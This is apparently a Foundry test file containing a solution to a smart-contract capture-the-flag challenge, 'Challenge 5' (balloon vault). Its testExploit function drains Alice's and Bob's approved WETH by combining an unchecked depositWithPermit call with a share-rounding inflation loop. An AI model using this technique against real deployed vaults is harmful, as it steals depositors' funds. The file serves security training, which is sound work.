// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {WETH} from "../src/5_balloon-vault/WETH.sol";
import {BallonVault} from "../src/5_balloon-vault/Vault.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/



/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge5Test is Test {
    BallonVault public vault;
    WETH public weth = new WETH();

    address public attacker = makeAddr("attacker");
    address public bob = makeAddr("bob");
    address public alice = makeAddr("alice");

    function setUp() public {
        vault = new BallonVault(address(weth));

        // Attacker starts with 10 ether
        vm.deal(address(attacker), 10 ether);

        // Set up Bob and Alice with 500 WETH each
        weth.deposit{value: 1000 ether}();
        weth.transfer(bob, 500 ether);
        weth.transfer(alice, 500 ether);

        vm.prank(bob);
        weth.approve(address(vault), 500 ether);
        vm.prank(alice);
        weth.approve(address(vault), 500 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge5Test -vvvv //
        ////////////////////////////////////////////////////*/

        //
        //vault.depositWithPermit(bob, 500 ether, block.number + 100, 0, 0, 0);

        //First we change our eth to weth
        weth.deposit{value: 10 ether}();

        //Then we approve the vault to spend our weth
        //NOTE: This would make the attacker vulnerable to the same attack. 
        weth.approve(address(vault), type(uint256).max);

        //Tracker of our balance
        uint256 currentAttackerBalance = weth.balanceOf(address(attacker));

        //Now we loop until we have more weth than Alice
        while(currentAttackerBalance < weth.balanceOf(address(alice)))
        {
            //Deposit 1 weth to get 1 share
            vault.depositWithPermit(address(attacker), 1, block.number + 100, 0, 0, 0);

            //Transfer all our money to the vault
            weth.transfer(address(vault), currentAttackerBalance-1);

            //Let Alice deposit but due to the division, she gets 0 shares
            vault.depositWithPermit(alice, currentAttackerBalance-1, block.number + 100, 0, 0, 0);

            //Now we withdraw our 1 share which is all the money in the vault
            vault.withdraw(vault.maxWithdraw(attacker), address(attacker), address(attacker));

            //Update the balance
            currentAttackerBalance = weth.balanceOf(address(attacker));
        }

        //Now we empty the rest of Alice's account, we do the same as above
        vault.depositWithPermit(address(attacker), 1, block.number + 100, 0, 0, 0);
        weth.transfer(address(vault), weth.balanceOf(address(alice)));
        vault.depositWithPermit(alice, weth.balanceOf(address(alice)), block.number + 100, 0, 0, 0);
        vault.withdraw(vault.maxWithdraw(attacker), address(attacker), address(attacker));


        //As we have the funds now, Bob is super easy to drain, we do the same as above
        vault.depositWithPermit(address(attacker), 1, block.number + 100, 0, 0, 0);
        weth.transfer(address(vault), weth.balanceOf(address(bob)));
        vault.depositWithPermit(bob, weth.balanceOf(address(bob)), block.number + 100, 0, 0, 0);
        vault.withdraw(vault.maxWithdraw(attacker), address(attacker), address(attacker));

        //==================================================//
        vm.stopPrank();

        assertGt(weth.balanceOf(address(attacker)), 1000 ether, "Attacker should have more than 1000 ether");
    }
}
